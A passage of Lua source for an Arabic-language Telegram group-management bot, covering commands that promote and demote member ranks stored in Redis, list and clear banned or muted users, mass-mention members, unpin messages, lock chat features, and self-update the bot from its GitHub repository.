if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,' تستطيع رفع احد وذالك لان تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:Admin:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته ادمن للمجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("تنزيل ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Admin:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من ادمنيه المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,' تستطيع رفع احد وذالك لان تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
redis:sadd(bot_id.."Tshakex:Vip:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم ترقيته مميز للمجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text == ("تنزيل مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
function FunctionStatus(arg, result)
redis:srem(bot_id.."Tshakex:Vip:Group"..msg.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","تم تنزيله من المميزين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
end

if text and text:match("^رفع مطور @(.*)$") and Dev_Bots(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته مطور في البوت")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع مطور @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^تنزيل مطور @(.*)$") and Dev_Bots(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من مطور")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل مطور @(.*)$")}, FunctionStatus, nil)
end
if text == 'تحديث السورس' and Dev_Bots(msg) then
download_to_file('https://raw.githubusercontent.com/TEAMTshakeXX/Tshake/master/Tshakex.lua','Tshakex.lua') 
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
end
if text and text:match("^رفع مطور ثانوي @(.*)$") and Dev_Bots(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Developer:Bot1", result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع مطور ثانوي @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^تنزيل مطور ثانوي @(.*)$") and Dev_Bots(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Developer:Bot1", result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من مطور ثانوي")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل CM @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^رفع منشئ اساسي @(.*)$") and DeveloperBot(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته منشئ اساسي")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع منشئ اساسي @(.*)$")}, FunctionStatus, nil)
return false
end

if text and text:match("^تنزيل منشئ اساسي @(.*)$") and DeveloperBot(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل منشئ اساسي @(.*)$")}, FunctionStatus, nil)
return false
end

if text and text:match("^رفع منشئ اساسي @(.*)$") then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته منشئ اساسي")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع منشئ اساسي @(.*)$")}, FunctionStatus, nil)
return false
end
end,nil)
return false
end

if text and text:match("^تنزيل منشئ اساسي @(.*)$") then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل منشئ اساسي @(.*)$")}, FunctionStatus, nil)
return false
end
end,nil)
return false
end

if text and text:match("^رفع منشئ @(.*)$") and PresidentGroup(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته منشئ في المجموعه")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع منشئ @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^تنزيل منشئ @(.*)$") and PresidentGroup(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل منشئ @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Manager:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته مدير المجموعه")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع مدير @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Manager:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من المدراء")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل مدير @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^رفع ادمن @(.*)$") and Owner(msg) then
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,' تستطيع رفع احد وذالك لان تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Admin:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته ادمن للمجموعه")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع ادمن @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^تنزيل ادمن @(.*)$") and Owner(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Admin:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من ادمنيه المجموعه")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل ادمن @(.*)$") }, FunctionStatus, nil)
end

if text and text:match("^رفع مميز @(.*)$") and Admin(msg) then
if not redis:get(bot_id..'Tshakex:Cheking:Seted'..msg.chat_id_) and not Owner(msg) then
send(msg.chat_id_, msg.id_,' تستطيع رفع احد وذالك لان تم تعطيل الرفع من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"عذرا هاذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Tshakex:Vip:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم ترقيته مميز للمجموعه")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^رفع مميز @(.*)$")}, FunctionStatus, nil)
end

if text and text:match("^تنزيل مميز @(.*)$") and Admin(msg) then
function FunctionStatus(arg, result)
if (result.id_) then
redis:srem(bot_id.."Tshakex:Vip:Group"..msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","تم تنزيله من المميزين")  
else
send(msg.chat_id_, msg.id_,"المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل مميز @(.*)$") }, FunctionStatus, nil)
end

if text == ("قائمة العام") and DeveloperBot1(msg) or text == ("المحظورين عام") and DeveloperBot1(msg) then
local list = redis:smembers(bot_id.."Tshakex:Removal:User:Groups")
if #list == 0 then
return send(msg.chat_id_, msg.id_,"• لا يوجد محظورين عام")
end
Gban = "\n• قائمة المحظورين عام في البوت\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Gban = Gban..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Gban)
end
end,nil)
end
end
if text == ("المكتومين عام") and DeveloperBot1(msg) then
local list = redis:smembers(bot_id.."Tshakex:Silence:User:Groups")
if #list == 0 then
return send(msg.chat_id_, msg.id_,"• لا يوجد مكتومين عام")
end
Gban = "\n• قائمة المكتومين عام في البوت\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Gban = Gban..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Gban)
end
end,nil)
end
end
if text == ("قائمة المطورين") and DeveloperBot(msg) then
local list = redis:smembers(bot_id.."Tshakex:Developer:Bot")
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مطور  ")
end
Sudos = "\n• قائمة مطور   في البوت \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Sudos = Sudos..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Sudos)
end
end,nil)
end
end
if text == ("قائمة المطورين الثانوين") and DeveloperBot1(msg) then
local list = redis:smembers(bot_id.."Tshakex:Developer:Bot1")
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مطور  ")
end
Sudos = "\n• قائمة مطور   في البوت \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Sudos = Sudos..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Sudos)
end
end,nil)
end
end
if text == "المنشئين الاساسيين" and PresidentGroup(msg) or text == "الاساسين" and PresidentGroup(msg) then
local list = redis:smembers(bot_id.."Tshakex:President:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد منشئين اساسيين")
end
Asase = "\n• قائمة المنشئين الاساسيين في المجموعه\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Asase = Asase..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Asase)
end
end,nil)
end
end
if text == ("المنشئين") and PresidentGroup(msg) then
local list = redis:smembers(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد منشئين")
end
Monsh = "\n• قائمة منشئين المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Monsh = Monsh..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Monsh)
end
end,nil)
end
end
if text == ("المدراء") and Constructor(msg) then
local list = redis:smembers(bot_id.."Tshakex:Manager:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مدراء")
end
mder = "\n• قائمة مدراء المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
mder = mder..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, mder)
end
end,nil)
end
end
if text == ("الادمنيه") and Owner(msg) then
local list = redis:smembers(bot_id.."Tshakex:Admin:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد ادمنيه")
end
Admin = "\n• قائمة الادمنيه في المجموعه\n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
Admin = Admin..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, Admin)
end
end,nil)
end
end
if text == ("المميزين") and Admin(msg) then
local list = redis:smembers(bot_id.."Tshakex:Vips:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مميزين")
end
vips = "\n• قائمة المميزين في المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
vips = vips..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, vips)
end
end,nil)
end
end
if text == ("المكتومين") and Admin(msg) then
local list = redis:smembers(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد مكتومين")
end
selint = "\n• قائمة المكتومين في المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
selint = selint..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, selint)
end
end,nil)
end
end
if text == ("المحظورين") and Admin(msg) then
local list = redis:smembers(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_)
if #list == 0 then
return send(msg.chat_id_, msg.id_, "• لا يوجد محظورين")
end
ban = "\n• قائمة المحظوريين في المجموعه \n━━━━━━━━\n"
for k,v in pairs(list) do
tdcli_function ({ID = "GetUser",user_id_ = v},function(arg,data) 
if data.username_ then
username = '[@'..data.username_..']'
else
username = v 
end
ban = ban..""..k.."~ : "..username.."\n"
if #list == k then
return send(msg.chat_id_, msg.id_, ban)
end
end,nil)
end
end
if text == 'تفعيل @all' and Admin(msg) then   
redis:del(bot_id..'Tshakex:tagall'..msg.chat_id_) 
Text = '\n اهلا عزيزي \n تم تفعيل امر @all' 
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل @all' and Admin(msg) then  
redis:set(bot_id..'Tshakex:tagall'..msg.chat_id_,true) 
Text = '\nاهلا عزيزي \n تم تعطيل امر @all' 
send(msg.chat_id_, msg.id_,Text) 
end 
if text == ("@all") and Admin(msg) and not redis:get(bot_id..'Tshakex:tagall'..msg.chat_id_) then
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_
},function(ta,FDFGERB)
x = 0
tags = 0
local list = FDFGERB.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = ""
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub(' ,','')
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end,nil)
end
if text and text:match('@all (.*)') and Admin(msg) and not redis:get(bot_id..'Tshakex:tagall'..msg.chat_id_) then
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_
},function(ta,FDFGERB)
x = 0
tags = 0
local list = FDFGERB.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = ""
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(text:match('@all (.*)')..'\n'..t).."&parse_mode=Markdown&reply_to_message_id="..msg_id)
end
end,nil)
end
end,nil)
end,nil)
end
if text == 'الغاء تثبيت الكل' and Admin(msg) then  
if redis:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
local url , res = https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
if res == 200 then
send(msg.chat_id_, msg.id_,"• تم الغاء تثبيت كل الرسائل المثبته")   
redis:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif res == 400 then
send(msg.chat_id_,msg.id_,"• انا لست مشرف هنا يرجى ترقيتي مشرف او ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات ثم اعد المحاوله")  
end
end
if text == ("مسح قائمة العام") and DeveloperBot1(msg) or text == ("مسح المحظورين عام") and DeveloperBot1(msg) then
redis:del(bot_id.."Tshakex:Removal:User:Groups")
send(msg.chat_id_, msg.id_, "• تم مسح المحظورين عام من البوت")
end
if text == ("مسح المكتومين عام") and DeveloperBot1(msg) or text == ("مسح المحظورين عام") and DeveloperBot1(msg) then
redis:del(bot_id.."Tshakex:Silence:User:Groups")
send(msg.chat_id_, msg.id_, "• تم مسح المكتومين عام من البوت")
end
if text == ("مسح قائمة المطورين") and Dev_Bots(msg) then
redis:del(bot_id.."Tshakex:Developer:Bot")
send(msg.chat_id_, msg.id_, "•  تم مسح قائمة C من البوت  ")
end
if text == ("مسح قائمة المطورين الثانوين") and Dev_Bots(msg) then
redis:del(bot_id.."Tshakex:Developer:Bot1")
send(msg.chat_id_, msg.id_, "•  تم مسح قائمة C من البوت  ")
end
if text == ("مسح المنشئين الاساسين") and DeveloperBot(msg) or text == "مسح الاساسين" and DeveloperBot(msg) then
redis:del(bot_id.."Tshakex:President:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المنشئين الاساسيين في المجموعه")
end
if text == ("مسح المنشئين الاساسين") or text == "مسح الاساسين" then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
redis:del(bot_id.."Tshakex:President:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المنشئين الاساسيين في المجموعه")
end
end,nil)
end
if text == ("مسح المنشئين") and PresidentGroup(msg) then
redis:del(bot_id.."Tshakex:Constructor:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المنشئين في المجموعه")
end
if text == ("مسح المدراء") and Constructor(msg) then
redis:del(bot_id.."Tshakex:Manager:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المدراء في المجموعه")
end
if text == ("مسح الادمنيه") and Owner(msg) then
redis:del(bot_id.."Tshakex:Admin:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح الادمنيه في المجموعه")
end
if text == ("مسح المميزين") and Admin(msg) then
redis:del(bot_id.."Tshakex:Vip:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المميزين في المجموعه")
end
if text == ("مسح المكتومين") and Admin(msg) then
redis:del(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المكتومين في المجموعه")
end
if text == ("مسح المقيدين") and Admin(msg) then
redis:del(bot_id.."Tshakex:Silence:kid:User:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "•  تم مسح المقيدين في المجموعه")
end
if text == ("مسح المحظورين") and Admin(msg) then
redis:del(bot_id.."Tshakex:Removal:User:Group"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "• تم مسح المحظورين في المجموعه")
end

if text ==  "قفل الدردشه" then
if not Owner(msg) then
return send(msg.chat_id_,msg.id_,'*•اهلا عزيزي \n عذرا الامر يخص - مدير - منشئ*')
end 
redis:set(bot_id.."Tshakex:Lock:text"..msg.chat_id_,true) 
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الدردشه")  
elseif text ==  "قفل الاضافه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:set(bot_id.."Tshakex:Lock:AddMempar"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل اضافة الاعضاء")  
elseif text ==  "قفل الدخول" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:set(bot_id.."Tshakex:Lock:Join"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل دخول الاعضاء")  
elseif text ==  "قفل البوتات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:set(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_,"del")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل البوتات")  
elseif text ==  "قفل البوتات بالطرد" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:set(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_,"kick")  
return Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","• تم قفل البوتات")  
elseif text ==  "قفل الاشعارات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end  
redis:set(bot_id.."Tshakex:Lock:tagservr"..msg.chat_id_,true)  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل الاشعارات")  
elseif text ==  "قفل التثبيت" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end 
redis:set(bot_id.."Tshakex:lockpin"..msg.chat_id_, true) 
redis:sadd(bot_id.."Tshakex:Lock:pin",msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  redis:set(bot_id.."Tshakex:Get:Id:Msg:Pin"..msg.chat_id_,data.pinned_message_id_)  end,nil)
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل التثبيت هنا")  
elseif text ==  "قفل التعديل" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end 
redis:set(bot_id.."Tshakex:Lock:edit"..msg.chat_id_,true) 
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل تعديل")  
elseif text ==  "قفل تعديل الميديا" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end 
redis:set(bot_id.."Tshakex:Lock:edit"..msg.chat_id_,true) 
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل تعديل")  
elseif text ==  "قفل الكل" then
if not Constructor(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي *')
end  
redis:set(bot_id.."Tshakex:Lock:tagservrbot"..msg.chat_id_,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do;redis:set(bot_id..lock..msg.chat_id_,"del");end
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل جميع الاوامر")  
elseif text ==  "فتح الاضافه" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."Tshakex:Lock:AddMempar"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Open_Status","• تم فتح اضافة الاعضاء")  
elseif text ==  "قفل السب" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:set(bot_id.."lock:Fshar"..msg.chat_id_,true)  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل السب")  
elseif text ==  "قفل السمايلات" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:set(bot_id.."lock:emoje"..msg.chat_id_,true)  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم قفل السمايلات")  
elseif text ==  "فتح السب" then
if not Admin(msg) then
return send(msg.chat_id_,msg.id_,'*• اهلا عزيزي \n عذرا الامر يخص- ادمن - مدير*')
end 
redis:del(bot_id.."lock:Fshar"..msg.chat_id_)  
return Send_Options(msg,msg.sender_user_id_,"Close_Status","• تم فتح السب")  
elseif text ==  "فتح السمايلات" then
